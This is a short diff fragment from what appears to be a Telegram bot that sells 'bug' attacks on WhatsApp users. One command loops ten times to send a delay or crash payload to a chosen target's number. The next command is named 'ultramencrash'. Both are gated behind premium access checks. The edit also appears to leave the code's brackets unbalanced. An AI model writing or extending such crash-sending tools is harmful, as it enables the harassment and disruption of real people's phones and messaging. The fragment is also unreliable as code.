@@ -2349,9 +2349,9 @@ bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 
   for (let i = 0; i < 10; i++) {
     await delayaw(sock, target);
-    console.log(`Gxion Succes Sending Bugs To : ${target}`);
-  }
-})
+    }
+  })();
+});
 /// --------- ( CASE BUG 7 ) ---------- \\\
 bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
